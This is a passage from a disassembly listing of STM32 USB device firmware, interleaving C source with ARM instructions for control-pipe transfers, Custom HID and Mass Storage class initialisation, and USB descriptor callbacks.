 800c22a:	7bfb      	ldrb	r3, [r7, #15]
}
 800c22c:	4618      	mov	r0, r3
 800c22e:	3714      	adds	r7, #20
 800c230:	46bd      	mov	sp, r7
 800c232:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c236:	4770      	bx	lr

0800c238 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c238:	b580      	push	{r7, lr}
 800c23a:	b084      	sub	sp, #16
 800c23c:	af00      	add	r7, sp, #0
 800c23e:	60f8      	str	r0, [r7, #12]
 800c240:	60b9      	str	r1, [r7, #8]
 800c242:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c244:	68fb      	ldr	r3, [r7, #12]
 800c246:	2202      	movs	r2, #2
 800c248:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c24c:	68fb      	ldr	r3, [r7, #12]
 800c24e:	687a      	ldr	r2, [r7, #4]
 800c250:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c252:	68fb      	ldr	r3, [r7, #12]
 800c254:	687a      	ldr	r2, [r7, #4]
 800c256:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c258:	687b      	ldr	r3, [r7, #4]
 800c25a:	68ba      	ldr	r2, [r7, #8]
 800c25c:	2100      	movs	r1, #0
 800c25e:	68f8      	ldr	r0, [r7, #12]
 800c260:	f000 fdbc 	bl	800cddc <USBD_LL_Transmit>

  return USBD_OK;
 800c264:	2300      	movs	r3, #0
}
 800c266:	4618      	mov	r0, r3
 800c268:	3710      	adds	r7, #16
 800c26a:	46bd      	mov	sp, r7
 800c26c:	bd80      	pop	{r7, pc}

0800c26e <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c26e:	b580      	push	{r7, lr}
 800c270:	b084      	sub	sp, #16
 800c272:	af00      	add	r7, sp, #0
 800c274:	60f8      	str	r0, [r7, #12]
 800c276:	60b9      	str	r1, [r7, #8]
 800c278:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c27a:	687b      	ldr	r3, [r7, #4]
 800c27c:	68ba      	ldr	r2, [r7, #8]
 800c27e:	2100      	movs	r1, #0
 800c280:	68f8      	ldr	r0, [r7, #12]
 800c282:	f000 fdab 	bl	800cddc <USBD_LL_Transmit>

  return USBD_OK;
 800c286:	2300      	movs	r3, #0
}
 800c288:	4618      	mov	r0, r3
 800c28a:	3710      	adds	r7, #16
 800c28c:	46bd      	mov	sp, r7
 800c28e:	bd80      	pop	{r7, pc}

0800c290 <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c290:	b580      	push	{r7, lr}
 800c292:	b084      	sub	sp, #16
 800c294:	af00      	add	r7, sp, #0
 800c296:	60f8      	str	r0, [r7, #12]
 800c298:	60b9      	str	r1, [r7, #8]
 800c29a:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c29c:	68fb      	ldr	r3, [r7, #12]
 800c29e:	2203      	movs	r2, #3
 800c2a0:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c2a4:	68fb      	ldr	r3, [r7, #12]
 800c2a6:	687a      	ldr	r2, [r7, #4]
 800c2a8:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c2ac:	68fb      	ldr	r3, [r7, #12]
 800c2ae:	687a      	ldr	r2, [r7, #4]
 800c2b0:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2b4:	687b      	ldr	r3, [r7, #4]
 800c2b6:	68ba      	ldr	r2, [r7, #8]
 800c2b8:	2100      	movs	r1, #0
 800c2ba:	68f8      	ldr	r0, [r7, #12]
 800c2bc:	f000 fdc6 	bl	800ce4c <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2c0:	2300      	movs	r3, #0
}
 800c2c2:	4618      	mov	r0, r3
 800c2c4:	3710      	adds	r7, #16
 800c2c6:	46bd      	mov	sp, r7
 800c2c8:	bd80      	pop	{r7, pc}

0800c2ca <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c2ca:	b580      	push	{r7, lr}
 800c2cc:	b084      	sub	sp, #16
 800c2ce:	af00      	add	r7, sp, #0
 800c2d0:	60f8      	str	r0, [r7, #12]
 800c2d2:	60b9      	str	r1, [r7, #8]
 800c2d4:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2d6:	687b      	ldr	r3, [r7, #4]
 800c2d8:	68ba      	ldr	r2, [r7, #8]
 800c2da:	2100      	movs	r1, #0
 800c2dc:	68f8      	ldr	r0, [r7, #12]
 800c2de:	f000 fdb5 	bl	800ce4c <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2e2:	2300      	movs	r3, #0
}
 800c2e4:	4618      	mov	r0, r3
 800c2e6:	3710      	adds	r7, #16
 800c2e8:	46bd      	mov	sp, r7
 800c2ea:	bd80      	pop	{r7, pc}

0800c2ec <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c2ec:	b580      	push	{r7, lr}
 800c2ee:	b082      	sub	sp, #8
 800c2f0:	af00      	add	r7, sp, #0
 800c2f2:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c2f4:	687b      	ldr	r3, [r7, #4]
 800c2f6:	2204      	movs	r2, #4
 800c2f8:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c2fc:	2300      	movs	r3, #0
 800c2fe:	2200      	movs	r2, #0
 800c300:	2100      	movs	r1, #0
 800c302:	6878      	ldr	r0, [r7, #4]
 800c304:	f000 fd6a 	bl	800cddc <USBD_LL_Transmit>

  return USBD_OK;
 800c308:	2300      	movs	r3, #0
}
 800c30a:	4618      	mov	r0, r3
 800c30c:	3708      	adds	r7, #8
 800c30e:	46bd      	mov	sp, r7
 800c310:	bd80      	pop	{r7, pc}

0800c312 <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c312:	b580      	push	{r7, lr}
 800c314:	b082      	sub	sp, #8
 800c316:	af00      	add	r7, sp, #0
 800c318:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c31a:	687b      	ldr	r3, [r7, #4]
 800c31c:	2205      	movs	r2, #5
 800c31e:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c322:	2300      	movs	r3, #0
 800c324:	2200      	movs	r2, #0
 800c326:	2100      	movs	r1, #0
 800c328:	6878      	ldr	r0, [r7, #4]
 800c32a:	f000 fd8f 	bl	800ce4c <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c32e:	2300      	movs	r3, #0
}
 800c330:	4618      	mov	r0, r3
 800c332:	3708      	adds	r7, #8
 800c334:	46bd      	mov	sp, r7
 800c336:	bd80      	pop	{r7, pc}

0800c338 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c338:	b580      	push	{r7, lr}
 800c33a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c33c:	2200      	movs	r2, #0
 800c33e:	4912      	ldr	r1, [pc, #72]	; (800c388 <MX_USB_DEVICE_Init+0x50>)
 800c340:	4812      	ldr	r0, [pc, #72]	; (800c38c <MX_USB_DEVICE_Init+0x54>)
 800c342:	f7fe fd68 	bl	800ae16 <USBD_Init>
 800c346:	4603      	mov	r3, r0
 800c348:	2b00      	cmp	r3, #0
 800c34a:	d001      	beq.n	800c350 <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c34c:	f7f4 fc7e 	bl	8000c4c <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c350:	490f      	ldr	r1, [pc, #60]	; (800c390 <MX_USB_DEVICE_Init+0x58>)
 800c352:	480e      	ldr	r0, [pc, #56]	; (800c38c <MX_USB_DEVICE_Init+0x54>)
 800c354:	f7fe fd8f 	bl	800ae76 <USBD_RegisterClass>
 800c358:	4603      	mov	r3, r0
 800c35a:	2b00      	cmp	r3, #0
 800c35c:	d001      	beq.n	800c362 <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c35e:	f7f4 fc75 	bl	8000c4c <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c362:	490c      	ldr	r1, [pc, #48]	; (800c394 <MX_USB_DEVICE_Init+0x5c>)
 800c364:	4809      	ldr	r0, [pc, #36]	; (800c38c <MX_USB_DEVICE_Init+0x54>)
 800c366:	f7fc fca5 	bl	8008cb4 <USBD_CUSTOM_HID_RegisterInterface>
 800c36a:	4603      	mov	r3, r0
 800c36c:	2b00      	cmp	r3, #0
 800c36e:	d001      	beq.n	800c374 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c370:	f7f4 fc6c 	bl	8000c4c <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c374:	4805      	ldr	r0, [pc, #20]	; (800c38c <MX_USB_DEVICE_Init+0x54>)
 800c376:	f7fe fdb4 	bl	800aee2 <USBD_Start>
 800c37a:	4603      	mov	r3, r0
 800c37c:	2b00      	cmp	r3, #0
 800c37e:	d001      	beq.n	800c384 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c380:	f7f4 fc64 	bl	8000c4c <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c384:	bf00      	nop
 800c386:	bd80      	pop	{r7, pc}
 800c388:	200001ac 	.word	0x200001ac
 800c38c:	200003c0 	.word	0x200003c0
 800c390:	2000002c 	.word	0x2000002c
 800c394:	2000019c 	.word	0x2000019c

0800c398 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c398:	b580      	push	{r7, lr}
 800c39a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c39c:	2200      	movs	r2, #0
 800c39e:	4912      	ldr	r1, [pc, #72]	; (800c3e8 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c3a0:	4812      	ldr	r0, [pc, #72]	; (800c3ec <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3a2:	f7fe fd38 	bl	800ae16 <USBD_Init>
 800c3a6:	4603      	mov	r3, r0
 800c3a8:	2b00      	cmp	r3, #0
 800c3aa:	d001      	beq.n	800c3b0 <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c3ac:	f7f4 fc4e 	bl	8000c4c <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c3b0:	490f      	ldr	r1, [pc, #60]	; (800c3f0 <MX_USB_DEVICE_Init_MSC+0x58>)
 800c3b2:	480e      	ldr	r0, [pc, #56]	; (800c3ec <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3b4:	f7fe fd5f 	bl	800ae76 <USBD_RegisterClass>
 800c3b8:	4603      	mov	r3, r0
 800c3ba:	2b00      	cmp	r3, #0
 800c3bc:	d001      	beq.n	800c3c2 <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c3be:	f7f4 fc45 	bl	8000c4c <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c3c2:	490c      	ldr	r1, [pc, #48]	; (800c3f4 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c3c4:	4809      	ldr	r0, [pc, #36]	; (800c3ec <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3c6:	f7fc ff27 	bl	8009218 <USBD_MSC_RegisterStorage>
 800c3ca:	4603      	mov	r3, r0
 800c3cc:	2b00      	cmp	r3, #0
 800c3ce:	d001      	beq.n	800c3d4 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c3d0:	f7f4 fc3c 	bl	8000c4c <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c3d4:	4805      	ldr	r0, [pc, #20]	; (800c3ec <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3d6:	f7fe fd84 	bl	800aee2 <USBD_Start>
 800c3da:	4603      	mov	r3, r0
 800c3dc:	2b00      	cmp	r3, #0
 800c3de:	d001      	beq.n	800c3e4 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c3e0:	f7f4 fc34 	bl	8000c4c <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c3e4:	bf00      	nop
 800c3e6:	bd80      	pop	{r7, pc}
 800c3e8:	200001ac 	.word	0x200001ac
 800c3ec:	2000069c 	.word	0x2000069c
 800c3f0:	200000a8 	.word	0x200000a8
 800c3f4:	20000220 	.word	0x20000220

0800c3f8 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c3f8:	b480      	push	{r7}
 800c3fa:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c3fc:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c3fe:	4618      	mov	r0, r3
 800c400:	46bd      	mov	sp, r7
 800c402:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c406:	4770      	bx	lr

0800c408 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c408:	b480      	push	{r7}
 800c40a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c40c:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c40e:	4618      	mov	r0, r3
 800c410:	46bd      	mov	sp, r7
 800c412:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c416:	4770      	bx	lr

0800c418 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c418:	b580      	push	{r7, lr}
 800c41a:	b082      	sub	sp, #8
 800c41c:	af00      	add	r7, sp, #0
 800c41e:	4603      	mov	r3, r0
 800c420:	460a      	mov	r2, r1
 800c422:	71fb      	strb	r3, [r7, #7]
 800c424:	4613      	mov	r3, r2
 800c426:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c428:	4803      	ldr	r0, [pc, #12]	; (800c438 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c42a:	f7fc fbd1 	bl	8008bd0 <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c42e:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c430:	4618      	mov	r0, r3
 800c432:	3708      	adds	r7, #8
 800c434:	46bd      	mov	sp, r7
 800c436:	bd80      	pop	{r7, pc}
 800c438:	200003c0 	.word	0x200003c0

0800c43c <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c43c:	b480      	push	{r7}
 800c43e:	b083      	sub	sp, #12
 800c440:	af00      	add	r7, sp, #0
 800c442:	4603      	mov	r3, r0
 800c444:	6039      	str	r1, [r7, #0]
 800c446:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c448:	683b      	ldr	r3, [r7, #0]
 800c44a:	2212      	movs	r2, #18
 800c44c:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c44e:	4b06      	ldr	r3, [pc, #24]	; (800c468 <USBD_FS_DeviceDescriptor+0x2c>)
 800c450:	681b      	ldr	r3, [r3, #0]
 800c452:	2b01      	cmp	r3, #1
 800c454:	d101      	bne.n	800c45a <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c456:	4b05      	ldr	r3, [pc, #20]	; (800c46c <USBD_FS_DeviceDescriptor+0x30>)
 800c458:	e000      	b.n	800c45c <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c45a:	4b05      	ldr	r3, [pc, #20]	; (800c470 <USBD_FS_DeviceDescriptor+0x34>)
}
 800c45c:	4618      	mov	r0, r3
 800c45e:	370c      	adds	r7, #12
 800c460:	46bd      	mov	sp, r7
 800c462:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c466:	4770      	bx	lr
 800c468:	20000978 	.word	0x20000978
 800c46c:	200001cc 	.word	0x200001cc
 800c470:	200001e0 	.word	0x200001e0

0800c474 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c474:	b480      	push	{r7}
 800c476:	b083      	sub	sp, #12
 800c478:	af00      	add	r7, sp, #0
 800c47a:	4603      	mov	r3, r0
 800c47c:	6039      	str	r1, [r7, #0]
 800c47e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c480:	683b      	ldr	r3, [r7, #0]
 800c482:	2204      	movs	r2, #4
 800c484:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c486:	4b03      	ldr	r3, [pc, #12]	; (800c494 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c488:	4618      	mov	r0, r3
 800c48a:	370c      	adds	r7, #12
 800c48c:	46bd      	mov	sp, r7
 800c48e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c492:	4770      	bx	lr
 800c494:	20000200 	.word	0x20000200

0800c498 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c498:	b580      	push	{r7, lr}
 800c49a:	b082      	sub	sp, #8
 800c49c:	af00      	add	r7, sp, #0
 800c49e:	4603      	mov	r3, r0
 800c4a0:	6039      	str	r1, [r7, #0]
 800c4a2:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c4a4:	79fb      	ldrb	r3, [r7, #7]
 800c4a6:	2b00      	cmp	r3, #0
 800c4a8:	d105      	bne.n	800c4b6 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4aa:	683a      	ldr	r2, [r7, #0]
 800c4ac:	4907      	ldr	r1, [pc, #28]	; (800c4cc <USBD_FS_ProductStrDescriptor+0x34>)
 800c4ae:	4808      	ldr	r0, [pc, #32]	; (800c4d0 <USBD_FS_ProductStrDescriptor+0x38>)
 800c4b0:	f7ff fe62 	bl	800c178 <USBD_GetString>
 800c4b4:	e004      	b.n	800c4c0 <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4b6:	683a      	ldr	r2, [r7, #0]
 800c4b8:	4904      	ldr	r1, [pc, #16]	; (800c4cc <USBD_FS_ProductStrDescriptor+0x34>)
 800c4ba:	4805      	ldr	r0, [pc, #20]	; (800c4d0 <USBD_FS_ProductStrDescriptor+0x38>)
 800c4bc:	f7ff fe5c 	bl	800c178 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c4c0:	4b02      	ldr	r3, [pc, #8]	; (800c4cc <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c4c2:	4618      	mov	r0, r3
 800c4c4:	3708      	adds	r7, #8
 800c4c6:	46bd      	mov	sp, r7
 800c4c8:	bd80      	pop	{r7, pc}
 800c4ca:	bf00      	nop
 800c4cc:	2000097c 	.word	0x2000097c
 800c4d0:	0800d12c 	.word	0x0800d12c

0800c4d4 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4d4:	b580      	push	{r7, lr}
 800c4d6:	b082      	sub	sp, #8
 800c4d8:	af00      	add	r7, sp, #0
 800c4da:	4603      	mov	r3, r0
 800c4dc:	6039      	str	r1, [r7, #0]
 800c4de:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c4e0:	683a      	ldr	r2, [r7, #0]
 800c4e2:	4904      	ldr	r1, [pc, #16]	; (800c4f4 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c4e4:	4804      	ldr	r0, [pc, #16]	; (800c4f8 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c4e6:	f7ff fe47 	bl	800c178 <USBD_GetString>
  return USBD_StrDesc;
 800c4ea:	4b02      	ldr	r3, [pc, #8]	; (800c4f4 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c4ec:	4618      	mov	r0, r3
 800c4ee:	3708      	adds	r7, #8
 800c4f0:	46bd      	mov	sp, r7
 800c4f2:	bd80      	pop	{r7, pc}
 800c4f4:	2000097c 	.word	0x2000097c
 800c4f8:	0800d140 	.word	0x0800d140

0800c4fc <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4fc:	b580      	push	{r7, lr}
 800c4fe:	b082      	sub	sp, #8
 800c500:	af00      	add	r7, sp, #0
 800c502:	4603      	mov	r3, r0
 800c504:	6039      	str	r1, [r7, #0]
 800c506:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c508:	683b      	ldr	r3, [r7, #0]
 800c50a:	221a      	movs	r2, #26
 800c50c:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c50e:	f000 f855 	bl	800c5bc <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c512:	4b02      	ldr	r3, [pc, #8]	; (800c51c <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c514:	4618      	mov	r0, r3
 800c516:	3708      	adds	r7, #8
 800c518:	46bd      	mov	sp, r7
 800c51a:	bd80      	pop	{r7, pc}
 800c51c:	20000204 	.word	0x20000204

0800c520 <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c520:	b580      	push	{r7, lr}
 800c522:	b082      	sub	sp, #8
 800c524:	af00      	add	r7, sp, #0
 800c526:	4603      	mov	r3, r0
 800c528:	6039      	str	r1, [r7, #0]
 800c52a:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c52c:	79fb      	ldrb	r3, [r7, #7]
 800c52e:	2b00      	cmp	r3, #0
 800c530:	d105      	bne.n	800c53e <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c532:	683a      	ldr	r2, [r7, #0]
 800c534:	4907      	ldr	r1, [pc, #28]	; (800c554 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c536:	4808      	ldr	r0, [pc, #32]	; (800c558 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c538:	f7ff fe1e 	bl	800c178 <USBD_GetString>
 800c53c:	e004      	b.n	800c548 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c53e:	683a      	ldr	r2, [r7, #0]
 800c540:	4904      	ldr	r1, [pc, #16]	; (800c554 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c542:	4805      	ldr	r0, [pc, #20]	; (800c558 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c544:	f7ff fe18 	bl	800c178 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c548:	4b02      	ldr	r3, [pc, #8]	; (800c554 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c54a:	4618      	mov	r0, r3
 800c54c:	3708      	adds	r7, #8
 800c54e:	46bd      	mov	sp, r7
 800c550:	bd80      	pop	{r7, pc}
 800c552:	bf00      	nop
 800c554:	2000097c 	.word	0x2000097c
 800c558:	0800d144 	.word	0x0800d144

0800c55c <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c55c:	b580      	push	{r7, lr}
 800c55e:	b082      	sub	sp, #8
 800c560:	af00      	add	r7, sp, #0
 800c562:	4603      	mov	r3, r0
 800c564:	6039      	str	r1, [r7, #0]
 800c566:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c568:	79fb      	ldrb	r3, [r7, #7]
 800c56a:	2b00      	cmp	r3, #0
 800c56c:	d105      	bne.n	800c57a <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c56e:	683a      	ldr	r2, [r7, #0]
 800c570:	4907      	ldr	r1, [pc, #28]	; (800c590 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c572:	4808      	ldr	r0, [pc, #32]	; (800c594 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c574:	f7ff fe00 	bl	800c178 <USBD_GetString>
 800c578:	e004      	b.n	800c584 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c57a:	683a      	ldr	r2, [r7, #0]
 800c57c:	4904      	ldr	r1, [pc, #16]	; (800c590 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c57e:	4805      	ldr	r0, [pc, #20]	; (800c594 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c580:	f7ff fdfa 	bl	800c178 <USBD_GetString>
  }
